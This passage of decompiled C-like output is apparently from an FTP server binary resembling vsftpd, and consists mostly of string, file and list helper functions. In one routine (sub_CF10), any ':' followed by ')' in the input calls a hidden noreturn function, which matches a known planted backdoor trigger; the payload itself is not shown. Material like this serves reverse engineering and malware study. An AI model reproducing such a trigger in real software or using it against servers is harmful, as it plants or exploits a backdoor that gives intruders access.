  unsigned int v2; // ebp
  unsigned int v3; // ebx
  const void *v4; // rsi
  const void *v5; // rdi
  unsigned int v6; // edx
  int result; // eax
  bool v8; // dl
  unsigned int v9; // ebx

  v2 = *(_DWORD *)(a2 + 8);
  v3 = *(_DWORD *)(a1 + 8);
  v4 = *(const void **)a2;
  v5 = *(const void **)a1;
  v6 = v3;
  if ( v2 <= v3 )
    v6 = v2;
  result = sub_136B0(v5, v4, v6);
  if ( !result )
  {
    v8 = v2 == v3;
    v9 = v3 - v2;
    if ( !v8 )
      return v9;
  }
  return result;
}

//----- (000000000000C5E0) ----------------------------------------------------
_BOOL8 __fastcall sub_C5E0(__int64 a1, __int64 a2)
{
  return sub_C5A0(a1, a2) == 0;
}

//----- (000000000000C600) ----------------------------------------------------
_BOOL8 __fastcall sub_C600(__int64 a1, const char *a2)
{
  unsigned int v2; // eax
  unsigned int v3; // ebx
  const void *v4; // rdi
  unsigned int v5; // edx
  unsigned int v6; // ebp
  int v7; // eax
  bool v8; // dl
  int v9; // ebx

  v2 = sub_13610(a2);
  v3 = *(_DWORD *)(a1 + 8);
  v4 = *(const void **)a1;
  v5 = v2;
  v6 = v2;
  if ( v3 <= v2 )
    v5 = v3;
  v7 = sub_136B0(v4, a2, v5);
  if ( !v7 )
  {
    v8 = v3 == v6;
    v9 = v3 - v6;
    if ( !v8 )
      v7 = v9;
  }
  return v7 == 0;
}

//----- (000000000000C660) ----------------------------------------------------
__int64 __fastcall sub_C660(char **a1, __int64 a2)
{
  return sub_C310(a1, *(const void **)a2, *(_DWORD *)(a2 + 8));
}

//----- (000000000000C670) ----------------------------------------------------
__int64 __fastcall sub_C670(char **a1, const char *a2)
{
  int v2; // eax

  v2 = sub_13610(a2);
  return sub_C310(a1, a2, v2);
}

//----- (000000000000C6A0) ----------------------------------------------------
__int64 __fastcall sub_C6A0(char **a1, char a2)
{
  char v3[12]; // [rsp+Ch] [rbp-Ch] BYREF

  v3[0] = a2;
  return sub_C310(a1, v3, 1);
}
// C6A0: using guessed type char var_C[12];

//----- (000000000000C6C0) ----------------------------------------------------
__int64 __fastcall sub_C6C0(char **a1, __int64 a2)
{
  const char *v2; // rbx
  int v3; // eax

  v2 = (const char *)sub_132D0(a2);
  v3 = sub_13610(v2);
  return sub_C310(a1, v2, v3);
}

//----- (000000000000C6F0) ----------------------------------------------------
__int64 __fastcall sub_C6F0(char **a1, __int64 a2)
{
  const char *v2; // rbx
  int v3; // eax

  v2 = (const char *)sub_13310(a2);
  v3 = sub_13610(v2);
  return sub_C310(a1, v2, v3);
}

//----- (000000000000C720) ----------------------------------------------------
__int64 __fastcall sub_C720(char **a1, double a2)
{
  const char *v2; // rbx
  int v3; // eax

  v2 = (const char *)sub_13350(a2);
  v3 = sub_13610(v2);
  return sub_C310(a1, v2, v3);
}

//----- (000000000000C750) ----------------------------------------------------
__int64 __fastcall sub_C750(__int64 a1)
{
  __int64 result; // rax
  unsigned int v2; // ebx
  __int64 v3; // r12

  result = *(unsigned int *)(a1 + 8);
  if ( (_DWORD)result )
  {
    v2 = 0;
    do
    {
      v3 = v2++;
      result = sub_13460(*(char *)(*(_QWORD *)a1 + v3));
      *(_BYTE *)(*(_QWORD *)a1 + v3) = result;
    }
    while ( *(_DWORD *)(a1 + 8) > v2 );
  }
  return result;
}

//----- (000000000000C7A0) ----------------------------------------------------
unsigned __int64 __fastcall sub_C7A0(__int64 a1, unsigned int a2)
{
  unsigned int v2; // eax
  int v3; // ebx
  char v5; // [rsp+7h] [rbp-21h] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  v2 = *(_DWORD *)(a1 + 8);
  if ( v2 < a2 )
  {
    v3 = a2 - v2 - 1;
    do
    {
      --v3;
      v5 = 32;
      sub_C310((char **)a1, &v5, 1);
    }
    while ( v3 != -1 );
  }
  return __readfsqword(0x28u) ^ v6;
}

//----- (000000000000C810) ----------------------------------------------------
unsigned __int64 __fastcall sub_C810(__int64 a1, unsigned int a2)
{
  unsigned int v2; // eax
  int v4; // ebx
  char v5; // [rsp+7h] [rbp-31h] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-30h]

  v6 = __readfsqword(0x28u);
  v2 = *(_DWORD *)(a1 + 8);
  if ( v2 < a2 )
  {
    v4 = a2 - v2 - 1;
    sub_C570((__int64)&qword_220C40);
    do
    {
      --v4;
      v5 = 32;
      sub_C310((char **)&qword_220C40, &v5, 1);
    }
    while ( v4 != -1 );
    sub_C310((char **)&qword_220C40, *(const void **)a1, *(_DWORD *)(a1 + 8));
    sub_C290(a1, (const void *)qword_220C40, dword_220C48);
  }
  return __readfsqword(0x28u) ^ v6;
}
// 220C40: using guessed type __int64 qword_220C40;
// 220C48: using guessed type int dword_220C48;

//----- (000000000000C8D0) ----------------------------------------------------
_BYTE *__fastcall sub_C8D0(__int64 a1, char a2, char a3)
{
  _BYTE *result; // rax
  unsigned int v4; // ecx

  result = (_BYTE *)*(unsigned int *)(a1 + 8);
  if ( (_DWORD)result )
  {
    v4 = 0;
    do
    {
      result = (_BYTE *)(*(_QWORD *)a1 + v4);
      if ( *result == a2 )
        *result = a3;
      ++v4;
    }
    while ( *(_DWORD *)(a1 + 8) > v4 );
  }
  return result;
}

//----- (000000000000C900) ----------------------------------------------------
__int64 __fastcall sub_C900(__int64 a1, const char *a2)
{
  int v4; // eax
  int v5; // edx
  __int64 v6; // r9
  __int64 v7; // rsi
  char v8; // di
  const char *v9; // rdx
  __int64 v11; // [rsp+14h] [rbp-24h]

  v4 = sub_13610(a2);
  v5 = *(_DWORD *)(a1 + 8);
  if ( !v5 )
    return 0LL;
  v6 = 0LL;
  v7 = (unsigned int)(v5 - 1) + 1LL;
  while ( 1 )
  {
    v8 = *(_BYTE *)(*(_QWORD *)a1 + v6);
    if ( v4 )
      break;
LABEL_8:
    if ( ++v6 == v7 )
      return 0LL;
  }
  if ( v8 != *a2 )
  {
    v9 = a2 + 1;
    while ( v9 != &a2[v4 - 1 + 1] )
    {
      if ( *v9++ == v8 )
        goto LABEL_10;
    }
    goto LABEL_8;
  }
LABEL_10:
  LODWORD(v11) = 1;
  HIDWORD(v11) = v6;
  return v11;
}

//----- (000000000000C9C0) ----------------------------------------------------
__int64 __fastcall sub_C9C0(__int64 a1, const char *a2)
{
  unsigned int v2; // eax
  unsigned int v3; // ebx
  unsigned int v4; // ebp
  __int64 v6; // [rsp+14h] [rbp-34h]

  v2 = sub_13610(a2);
  if ( !v2 )
    return 0LL;
  v3 = 0;
  v4 = v2;
  if ( *(_DWORD *)(a1 + 8) < v2 )
    return 0LL;
  while ( sub_136B0((const void *)(*(_QWORD *)a1 + v3), a2, v4) )
  {
    if ( *(_DWORD *)(a1 + 8) - v4 < ++v3 )
      return 0LL;
  }
  LODWORD(v6) = 1;
  HIDWORD(v6) = v3;
  return v6;
}

//----- (000000000000CA50) ----------------------------------------------------
__int64 __fastcall sub_CA50(__int64 a1, _QWORD *a2)
{
  const char *v2; // rax

  v2 = (const char *)sub_C510(a2);
  return sub_C9C0(a1, v2);
}

//----- (000000000000CA70) ----------------------------------------------------
__int64 __fastcall sub_CA70(__int64 a1, char a2)
{
  char v3[2]; // [rsp+26h] [rbp-12h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-10h]

  v3[0] = a2;
  v3[1] = 0;
  v4 = __readfsqword(0x28u);
  return sub_C9C0(a1, v3);
}

//----- (000000000000CAC0) ----------------------------------------------------
__int64 __fastcall sub_CAC0(__int64 a1, const char *a2)
{
  unsigned int v2; // eax
  unsigned int v3; // ebp
  __int64 v4; // rbx
  __int64 v6; // [rsp+14h] [rbp-34h]

  v2 = sub_13610(a2);
  if ( !v2 )
    return 0LL;
  v3 = v2;
  v4 = *(_DWORD *)(a1 + 8) - v2;
  if ( *(_DWORD *)(a1 + 8) < v2 )
    return 0LL;
  while ( sub_136B0((const void *)(v4 + *(_QWORD *)a1), a2, v3) )
  {
    if ( --v4 == -1 )
      return 0LL;
  }
  LODWORD(v6) = 1;
  HIDWORD(v6) = v4;
  return v6;
}

//----- (000000000000CB50) ----------------------------------------------------
_BYTE *__fastcall sub_CB50(__int64 a1, __int64 a2, const char *a3, int a4)
{
  unsigned int v6; // ebx
  unsigned int v7; // edx
  _BYTE *result; // rax
  __int64 v9; // [rsp+4h] [rbp-34h]

  v6 = sub_13610(a3);
  if ( !a4 )
  {
    v9 = sub_C9C0(a1, a3);
    if ( (_DWORD)v9 )
      goto LABEL_3;
    return sub_C570(a2);
  }
  v9 = sub_CAC0(a1, a3);
  if ( !(_DWORD)v9 )
    return sub_C570(a2);
LABEL_3:
  v7 = *(_DWORD *)(a1 + 8);
  if ( v6 + HIDWORD(v9) > v7 )
    sub_4B30("indexx invalid in str_split_text");
  sub_C290(a2, (const void *)(*(_QWORD *)a1 + HIDWORD(v9) + (unsigned __int64)v6), v7 - HIDWORD(v9) - v6);
  if ( HIDWORD(v9) >= *(_DWORD *)(a1 + 12) )
    sub_4B30("trunc_len not smaller than alloc_bytes in str_trunc");
  result = *(_BYTE **)a1;
  *(_DWORD *)(a1 + 8) = HIDWORD(v9);
  result[HIDWORD(v9)] = 0;
  return result;
}

//----- (000000000000CC40) ----------------------------------------------------
_BYTE *__fastcall sub_CC40(__int64 a1, __int64 a2, const char *a3)
{
  return sub_CB50(a1, a2, a3, 0);
}

//----- (000000000000CC50) ----------------------------------------------------
__int64 __fastcall sub_CC50(__int64 a1, const char *a2, const char *a3)
{
  void *v4; // rdi
  unsigned int v5; // r15d
  __int64 result; // rax
  int v7; // eax

  sub_C290((__int64)&qword_220C30, *(const void **)a1, *(_DWORD *)(a1 + 8));
  v4 = *(void **)a1;
  if ( v4 )
    sub_12BB0(v4);
  *(_QWORD *)a1 = 0LL;
  *(_QWORD *)(a1 + 8) = 0LL;
  v5 = dword_220C38;
  do
  {
    sub_CB50((__int64)&qword_220C30, (__int64)&qword_220C20, a2, 0);
    sub_C310((char **)a1, qword_220C30, dword_220C38);
    if ( dword_220C38 < v5 )
    {
      v7 = sub_13610(a3);
      sub_C310((char **)a1, a3, v7);
    }
    result = sub_C290((__int64)&qword_220C30, qword_220C20, dword_220C28);
    v5 = dword_220C38;
  }
  while ( dword_220C38 );
  return result;
}
// 220C20: using guessed type const void *qword_220C20;
// 220C28: using guessed type int dword_220C28;
// 220C30: using guessed type const void *qword_220C30;
// 220C38: using guessed type int dword_220C38;

//----- (000000000000CD40) ----------------------------------------------------
unsigned __int64 __fastcall sub_CD40(__int64 a1, __int64 a2, char a3)
{
  char v4[2]; // [rsp+6h] [rbp-12h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-10h]

  v4[0] = a3;
  v4[1] = 0;
  v5 = __readfsqword(0x28u);
  sub_CB50(a1, a2, v4, 0);
  return __readfsqword(0x28u) ^ v5;
}

//----- (000000000000CDA0) ----------------------------------------------------
unsigned __int64 __fastcall sub_CDA0(__int64 a1, __int64 a2, char a3)
{
  char v4[2]; // [rsp+6h] [rbp-12h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-10h]

  v4[0] = a3;
  v4[1] = 0;
  v5 = __readfsqword(0x28u);
  sub_CB50(a1, a2, v4, 1);
  return __readfsqword(0x28u) ^ v5;
}

//----- (000000000000CDF0) ----------------------------------------------------
__int64 __fastcall sub_CDF0(__int64 a1, _QWORD *a2)
{
  const char *v2; // rax

  v2 = (const char *)sub_C510(a2);
  return sub_CAC0(a1, v2);
}

//----- (000000000000CE10) ----------------------------------------------------
__int64 __fastcall sub_CE10(__int64 a1, __int64 a2, unsigned int a3)
{
  if ( *(_DWORD *)(a1 + 8) < a3 )
    sub_4B30("chars invalid in str_left");
  return sub_C290(a2, *(const void **)a1, a3);
}

//----- (000000000000CE50) ----------------------------------------------------
__int64 __fastcall sub_CE50(__int64 a1, __int64 a2, unsigned int a3)
{
  if ( *(_DWORD *)(a1 + 8) < a3 )
    sub_4B30("chars invalid in str_right");
  return sub_C290(a2, (const void *)(*(_QWORD *)a1 + *(_DWORD *)(a1 + 8) - a3), a3);
}

//----- (000000000000CEA0) ----------------------------------------------------
__int64 __fastcall sub_CEA0(__int64 a1, __int64 a2, unsigned int a3)
{
  unsigned int v4; // edx

  v4 = *(_DWORD *)(a1 + 8);
  if ( v4 < a3 )
    sub_4B30("invalid indexx in str_mid_to_end");
  return sub_C290(a2, (const void *)(*(_QWORD *)a1 + a3), v4 - a3);
}

//----- (000000000000CEE0) ----------------------------------------------------
__int64 __fastcall sub_CEE0(__int64 a1, unsigned int a2)
{
  if ( *(_DWORD *)(a1 + 8) <= a2 )
    sub_4B30("bad indexx in str_get_char_at");
  return *(unsigned __int8 *)(*(_QWORD *)a1 + a2);
}

//----- (000000000000CF10) ----------------------------------------------------
__int64 __fastcall sub_CF10(__int64 a1)
{
  unsigned int v1; // ebx
  __int64 v2; // r12

  if ( !*(_DWORD *)(a1 + 8) )
    return 0LL;
  v1 = 0;
  while ( 1 )
  {
    v2 = v1;
    if ( (unsigned int)sub_13490(*(char *)(*(_QWORD *)a1 + v1)) )
      break;
    ++v1;
    if ( *(_BYTE *)(*(_QWORD *)a1 + v2) == 58 && *(_BYTE *)(*(_QWORD *)a1 + v1) == 41 )
      sub_16100();
    if ( *(_DWORD *)(a1 + 8) <= v1 )
      return 0LL;
  }
  return 1LL;
}
// 16100: using guessed type void __noreturn sub_16100(void);

//----- (000000000000CF90) ----------------------------------------------------
__int64 __fastcall sub_CF90(__int64 a1)
{
  unsigned int v1; // ebx
  __int64 result; // rax

  if ( !*(_DWORD *)(a1 + 8) )
    return 1LL;
  v1 = 0;
  while ( 1 )
  {
    result = sub_13490(*(char *)(*(_QWORD *)a1 + v1));
    if ( !(_DWORD)result )
      break;
    if ( *(_DWORD *)(a1 + 8) <= ++v1 )
      return 1LL;
  }
  return result;
}

//----- (000000000000CFF0) ----------------------------------------------------
__int64 __fastcall sub_CFF0(__int64 a1)
{
  unsigned int v1; // ebx

  if ( !*(_DWORD *)(a1 + 8) )
    return 0LL;
  v1 = 0;
  do
  {
    if ( !(unsigned int)sub_134B0(*(char *)(*(_QWORD *)a1 + v1)) )
      return 1LL;
    ++v1;
  }
  while ( *(_DWORD *)(a1 + 8) > v1 );
  return 0LL;
}

//----- (000000000000D050) ----------------------------------------------------
__int64 __fastcall sub_D050(_QWORD *a1)
{
  const char *v1; // rax

  v1 = (const char *)sub_C510(a1);
  return sub_13230(v1);
}

//----- (000000000000D070) ----------------------------------------------------
__int64 __fastcall sub_D070(_QWORD *a1)
{
  const char *v1; // rax

  v1 = (const char *)sub_C510(a1);
  return sub_13250(v1);
}

//----- (000000000000D090) ----------------------------------------------------
__int64 __fastcall sub_D090(_QWORD *a1)
{
  char *v1; // rax

  v1 = (char *)sub_C510(a1);
  return sub_133F0(v1);
}

//----- (000000000000D0B0) ----------------------------------------------------
__int64 __fastcall sub_D0B0(__int64 a1, __int64 a2, unsigned int *a3)
{
  unsigned int v5; // r14d
  unsigned int v6; // ebp
  __int64 v7; // rbx
  __int64 result; // rax
  _BYTE *v9; // rsi
  __int64 v10; // rax
  unsigned int v11; // ebx
  unsigned int v12; // edx

  v5 = *a3;
  v6 = *(_DWORD *)(a1 + 8);
  v7 = sub_C510((_QWORD *)a1);
  if ( v5 > v6 )
    sub_4B30("p_pos out of range in str_getline");
  sub_C570(a2);
  result = 0LL;
  if ( v5 != v6 )
  {
    v9 = (_BYTE *)(v7 + v5);
    if ( v5 >= v6 )
    {
      v11 = v5;
      v12 = 0;
    }
    else
    {
      if ( *v9 == 10 )
      {
        v11 = v5;
        v12 = 0;
      }
      else
      {
        v10 = v7 + v5 + 1;
        v11 = v5;
        do
        {
          if ( v6 == ++v11 )
          {
            v12 = v11 - v5;
            goto LABEL_9;
          }
          ++v10;
        }
        while ( *(_BYTE *)(v10 - 1) != 10 );
        v12 = v11 - v5;
      }
      ++v11;
    }
LABEL_9:
    sub_C290(a2, v9, v12);
    *a3 = v11;
    return 1LL;
  }
  return result;
}

//----- (000000000000D180) ----------------------------------------------------
__int64 __fastcall sub_D180(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  unsigned int v3; // [rsp+4h] [rbp-34h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-30h]

  v4 = __readfsqword(0x28u);
  v3 = 0;
  while ( 1 )
  {
    result = sub_D0B0(a1, (__int64)&unk_220C10, &v3);
    if ( !(_DWORD)result )
      break;
    if ( !sub_C5A0((__int64)&unk_220C10, a2) )
      return 1LL;
  }
  return result;
}

//----- (000000000000D210) ----------------------------------------------------
__int64 __fastcall sub_D210(__int64 a1, char a2)
{
  __int64 result; // rax
  unsigned int v3; // ebx

  result = *(unsigned int *)(a1 + 8);
  if ( (_DWORD)result )
  {
    v3 = 0;
    do
    {
      result = sub_134B0(*(char *)(*(_QWORD *)a1 + v3));
      if ( !(_DWORD)result )
      {
        result = *(_QWORD *)a1;
        *(_BYTE *)(*(_QWORD *)a1 + v3) = a2;
      }
      ++v3;
    }
    while ( *(_DWORD *)(a1 + 8) > v3 );
  }
  return result;
}

//----- (000000000000D270) ----------------------------------------------------
__int64 __fastcall sub_D270(
        __int64 a1,
        __int64 a2,
        char a3,
        _BYTE *a4,
        unsigned int a5,
        __int64 (__fastcall *a6)(__int64, _BYTE *, _QWORD),
        __int64 (__fastcall *a7)(__int64, _BYTE *, _QWORD))
{
  __int64 v7; // rax
  _BYTE *v9; // rbp
  unsigned int v10; // ebx
  unsigned int v11; // eax
  __int64 v12; // r14
  __int64 i; // rax
  unsigned int v14; // r15d
  int v15; // eax
  unsigned int v16; // r14d
  _BYTE *v17; // r15
  unsigned int v18; // ebx
  unsigned int v19; // r12d
  _BYTE *v21; // [rsp+8h] [rbp-60h]

  v7 = a5;
  v9 = a4;
  v10 = a5;
  v21 = &a4[a5];
  while ( 1 )
  {
    if ( v21 != &v9[v7] )
      sub_4B30("poor buffer accounting in str_netfd_alloc");
    if ( !v10 )
    {
      v18 = -1;
      sub_C570(a2);
      return v18;
    }
    v11 = a6(a1, v9, v10);
    v12 = v11;
    if ( (unsigned int)sub_13F40(v11) )
      sub_4B80();
    if ( !(_DWORD)v12 )
      sub_4B80();
    if ( a3 == *v9 )
      break;
    for ( i = 1LL; i != (unsigned int)(v12 - 1) + 1LL; ++i )
    {
      if ( v9[i] == a3 )
      {
        v16 = i + 1;
        v17 = &v9[i];
        v18 = i;
        goto LABEL_18;
      }
    }
    if ( v10 < (unsigned int)v12 )
      sub_4B30("bytes_read > left in str_netfd_alloc");
    v14 = a7(a1, v9, (unsigned int)v12);
    v10 -= v12;
    v15 = sub_13F40(v14);
    if ( (_DWORD)v12 != v14 || v15 )
      sub_4B80();
    v9 += v12;
    v7 = v10;
  }
  v17 = v9;
  v18 = 0;
  v16 = 1;
LABEL_18:
  v19 = a7(a1, v9, v16);
  if ( (unsigned int)sub_13F40(v19) || v19 != v16 )
    sub_4B80();
  if ( *v17 != a3 )
    sub_4B80();
  sub_C3B0(a2, a4, a3);
  return v18;
}

//----- (000000000000D460) ----------------------------------------------------
__int64 __fastcall sub_D460(_QWORD *a1, unsigned int a2)
{
  int v2; // ebp
  unsigned int v3; // ebx

  v2 = sub_C500((__int64)a1);
  if ( !v2 )
    sub_4B30("zero str_len in str_netfd_write");
  v3 = sub_D580(a1, a2);
  if ( (unsigned int)sub_13F40(v3) )
    return 0xFFFFFFFFLL;
  else
    return (unsigned int)-(v3 != v2);
}

//----- (000000000000D4C0) ----------------------------------------------------
__int64 __fastcall sub_D4C0(__int64 *a1, unsigned int a2, unsigned int a3)
{
  unsigned int v4; // ebx

  sub_C4B0((__int64)a1, a3);
  sub_C470(a1, a3);
  v4 = sub_D5B0(a1, a2);
  if ( (unsigned int)sub_13F40(v4) )
  {
    return (unsigned int)-1;
  }
  else if ( v4 != a3 )
  {
    return (unsigned int)-1;
  }
  return v4;
}

//----- (000000000000D520) ----------------------------------------------------
char *__fastcall sub_D520(__int64 a1)
{
  char *result; // rax

  if ( !qword_220C58 )
    sub_A800((unsigned __int64 *)&qword_220C58, 0x1000u);
  sub_C570(a1);
  result = sub_13530((char *)qword_220C58, 0x1000u);
  if ( result )
    return (char *)sub_C370(a1, (const char *)qword_220C58);
  return result;
}
// 220C58: using guessed type __int64 qword_220C58;

//----- (000000000000D580) ----------------------------------------------------
__int64 __fastcall sub_D580(_QWORD *a1, unsigned int a2)
{
  int v2; // r12d
  __int64 v3; // rax

  v2 = sub_C500((__int64)a1);
  v3 = sub_C510(a1);
  return sub_129A0(a2, v3, v2);
}

//----- (000000000000D5B0) ----------------------------------------------------
__int64 __fastcall sub_D5B0(_QWORD *a1, unsigned int a2)
{
  int v2; // r12d
  __int64 v3; // rax

  v2 = sub_C500((__int64)a1);
  v3 = sub_C510(a1);
  return sub_12920(a2, v3, v2);
}

//----- (000000000000D5E0) ----------------------------------------------------
int __fastcall sub_D5E0(_QWORD *a1, __mode_t a2)
{
  const char *v2; // rax

  v2 = (const char *)sub_C510(a1);
  return j__mkdir(v2, a2);
}

//----- (000000000000D600) ----------------------------------------------------
int __fastcall sub_D600(_QWORD *a1)
{
  const char *v1; // rax

  v1 = (const char *)sub_C510(a1);
  return j__rmdir(v1);
}

//----- (000000000000D620) ----------------------------------------------------
int __fastcall sub_D620(_QWORD *a1)
{
  const char *v1; // rax

  v1 = (const char *)sub_C510(a1);
  return j__unlink(v1);
}

//----- (000000000000D640) ----------------------------------------------------
int __fastcall sub_D640(_QWORD *a1)
{
  const char *v1; // rax

  v1 = (const char *)sub_C510(a1);
  return j__chdir(v1);
}

//----- (000000000000D660) ----------------------------------------------------
__int64 __fastcall sub_D660(_QWORD *a1, int a2)
{
  __int64 v2; // rax

  if ( a2 != 1 )
    sub_4B30("unknown mode value in str_open");
  v2 = sub_C510(a1);
  return sub_137D0(v2, 1);
}

//----- (000000000000D6A0) ----------------------------------------------------
int __fastcall sub_D6A0(_QWORD *a1, struct stat64 **a2)
{
  char *v2; // rax

  v2 = (char *)sub_C510(a1);
  return sub_13960(v2, a2);
}

//----- (000000000000D6C0) ----------------------------------------------------
int __fastcall sub_D6C0(_QWORD *a1, struct stat64 **a2)
{
  char *v2; // rax

  v2 = (char *)sub_C510(a1);
  return sub_139B0(v2, a2);
}

//----- (000000000000D6E0) ----------------------------------------------------
int __fastcall sub_D6E0(_QWORD *a1)
{
  const char *v1; // rdi

  v1 = (const char *)sub_C510(a1);
  return open64(v1, 1217, (unsigned int)dword_221BA4);
}
// 221BA4: using guessed type int dword_221BA4;

//----- (000000000000D700) ----------------------------------------------------
int __fastcall sub_D700(_QWORD *a1)
{
  unsigned int v1; // ebx
  const char *v2; // rax

  v1 = dword_221BA4;
  v2 = (const char *)sub_C510(a1);
  return sub_13840(v2, v1);
}
// 221BA4: using guessed type int dword_221BA4;

//----- (000000000000D720) ----------------------------------------------------
int __fastcall sub_D720(_QWORD *a1, __int16 a2)
{
  const char *v2; // rax

  v2 = (const char *)sub_C510(a1);
  return sub_13E60(v2, a2);
}

//----- (000000000000D740) ----------------------------------------------------
int __fastcall sub_D740(_QWORD *a1, _QWORD *a2)
{
  const char *v2; // rbx
  const char *v3; // rax

  v2 = (const char *)sub_C510(a2);
  v3 = (const char *)sub_C510(a1);
  return j__rename(v3, v2);
}

//----- (000000000000D770) ----------------------------------------------------
DIR *__fastcall sub_D770(_QWORD *a1)
{
  const char *v1; // rax

  v1 = (const char *)sub_C510(a1);
  return j__opendir(v1);
}

//----- (000000000000D790) ----------------------------------------------------
_BYTE *__fastcall sub_D790(__int64 a1, DIR *a2)
{
  char *v2; // rbp
  _BYTE *result; // rax

  v2 = sub_135F0(a2);
  result = sub_C570(a1);
  if ( v2 )
    return (_BYTE *)sub_C370(a1, v2);
  return result;
}

//----- (000000000000D7D0) ----------------------------------------------------
__int64 __fastcall sub_D7D0(__int64 a1, _QWORD *a2)
{
  char *v2; // rbx
  const char *v3; // rax
  unsigned int v4; // ebx

  if ( !qword_220C50 )
    sub_A800((unsigned __int64 *)&qword_220C50, 0x1000u);
  sub_C570(a1);
  v2 = (char *)qword_220C50;
  v3 = (const char *)sub_C510(a2);
  v4 = sub_13F10(v3, v2, 4096);
  if ( !(unsigned int)sub_13F40(v4) )
  {
    v4 = 0;
    sub_C370(a1, (const char *)qword_220C50);
  }
  return v4;
}
// 220C50: using guessed type __int64 qword_220C50;

//----- (000000000000D850) ----------------------------------------------------
struct passwd *__fastcall sub_D850(_QWORD *a1)
{
  const char *v1; // rax

  v1 = (const char *)sub_C510(a1);
  return j__getpwnam(v1);
}

//----- (000000000000D870) ----------------------------------------------------
__int64 __fastcall sub_D870(_QWORD *a1, int a2)
{
  const char *v2; // rax

  v2 = (const char *)sub_C510(a1);
  return sub_156B0(v2, a2);
}

//----- (000000000000D890) ----------------------------------------------------
int __fastcall compar(char *a1, char *a2)
{
  char *v2; // rbp
  char *v3; // rbx

  v2 = a1 + 16;
  if ( sub_C4F0((__int64)(a1 + 16)) )
    v2 = a1;
  v3 = a2 + 16;
  if ( sub_C4F0((__int64)(a2 + 16)) )
    v3 = a2;
  return sub_C5A0((__int64)v3, (__int64)v2);
}

//----- (000000000000D8D0) ----------------------------------------------------
int __fastcall sub_D8D0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rbp

  v2 = a1 + 16;
  if ( sub_C4F0(a1 + 16) )
    v2 = a1;
  v3 = a2 + 16;
  if ( sub_C4F0(a2 + 16) )
    v3 = a2;
  return sub_C5A0(v2, v3);
}

//----- (000000000000D910) ----------------------------------------------------
void __fastcall sub_D910(__int64 a1)
{
  unsigned int v2; // ebp
  __int64 v3; // rbx
  void *v4; // rdi

  if ( *(_DWORD *)(a1 + 4) )
  {
    v2 = 0;
    do
    {
      v3 = v2++;
      v3 *= 32LL;
      sub_C440(v3 + *(_QWORD *)(a1 + 8));
      sub_C440(*(_QWORD *)(a1 + 8) + v3 + 16);
    }
    while ( *(_DWORD *)(a1 + 4) > v2 );
  }
  v4 = *(void **)(a1 + 8);
  *(_QWORD *)a1 = 0LL;
  if ( v4 )
  {
    sub_12BB0(v4);
    *(_QWORD *)(a1 + 8) = 0LL;
  }
}

//----- (000000000000D980) ----------------------------------------------------
__int64 __fastcall sub_D980(__int64 a1)
{
  return *(unsigned int *)(a1 + 4);
}

//----- (000000000000D990) ----------------------------------------------------
__int64 __fastcall sub_D990(__int64 a1, __int64 a2)
{
  unsigned int v2; // ebx

  if ( !*(_DWORD *)(a1 + 4) )
    return 0LL;
  v2 = 0;
  do
  {
    if ( sub_C5E0(a2, *(_QWORD *)(a1 + 8) + 32LL * v2) )
      return 1LL;
    ++v2;
  }
  while ( *(_DWORD *)(a1 + 4) > v2 );
  return 0LL;
}

//----- (000000000000D9F0) ----------------------------------------------------
__int64 __fastcall sub_D9F0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rsi
  char *v6; // rax
  __m128i si128; // xmm0
  __m128i *v8; // rbx
  __int64 result; // rax

  v5 = *(unsigned int *)(a1 + 4);
  if ( (_DWORD)v5 == *(_DWORD *)a1 )
  {
    if ( (_DWORD)v5 )
    {
      *(_DWORD *)a1 = 2 * v5;
      v6 = (char *)sub_12B40(*(void **)(a1 + 8), (unsigned int)((_DWORD)v5 << 6));
    }
    else
    {
      *(_DWORD *)a1 = 32;
      v6 = (char *)sub_12AE0(0x400uLL);
    }
    v5 = *(unsigned int *)(a1 + 4);
    *(_QWORD *)(a1 + 8) = v6;
  }
  else
  {
    v6 = *(char **)(a1 + 8);
  }
  si128 = _mm_load_si128((const __m128i *)&xmmword_220C60);
  v8 = (__m128i *)&v6[32 * v5];
  *v8 = si128;
  v8[1] = si128;
  result = sub_C3A0((__int64)v8, a2);
  if ( a3 )
    result = sub_C3A0((__int64)v8[1].m128i_i64, a3);
  ++*(_DWORD *)(a1 + 4);
  return result;
}
// 220C60: using guessed type __int128 xmmword_220C60;

//----- (000000000000DAA0) ----------------------------------------------------
void __fastcall sub_DAA0(__int64 a1, int a2)
{
  unsigned int v2; // eax
  void *v3; // rdi
  int (*v4)(const void *, const void *); // rcx

  v2 = *(_DWORD *)(a1 + 4);
  v3 = *(void **)(a1 + 8);
  if ( a2 )
    v4 = (int (*)(const void *, const void *))compar;
  else
    v4 = (int (*)(const void *, const void *))sub_D8D0;
  qsort(v3, v2, 0x20uLL, v4);
}

//----- (000000000000DAE0) ----------------------------------------------------
__int64 __fastcall sub_DAE0(__int64 a1, unsigned int a2)
{
  if ( *(_DWORD *)(a1 + 4) <= a2 )
    sub_4B30("indexx out of range in str_list_get_str");
  return *(_QWORD *)(a1 + 8) + 32LL * a2;
}

//----- (000000000000DB20) ----------------------------------------------------
unsigned __int64 __fastcall sub_DB20(__int64 a1, __int64 a2, int a3)
{
  unsigned int v5; // [rsp+Ch] [rbp-4Ch] BYREF
  __int64 v6[3]; // [rsp+10h] [rbp-48h] BYREF
  unsigned __int64 v7; // [rsp+28h] [rbp-30h]

  v7 = __readfsqword(0x28u);
  v6[0] = 0LL;
  v6[1] = 0LL;
  v5 = 0;
  while ( (unsigned int)sub_D0B0(a2, (__int64)v6, &v5) )
    sub_56A0(a1, a3, (__int64)v6);
  sub_C440((__int64)v6);
  return __readfsqword(0x28u) ^ v7;
}

//----- (000000000000DBC0) ----------------------------------------------------
unsigned __int64 __fastcall sub_DBC0(__int64 a1, int a2)
{
  _QWORD *v3; // rax
  __int64 v4[2]; // [rsp+0h] [rbp-58h] BYREF
  __int64 v5[3]; // [rsp+10h] [rbp-48h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-30h]

  v6 = __readfsqword(0x28u);
  v4[0] = 0LL;
  v4[1] = 0LL;
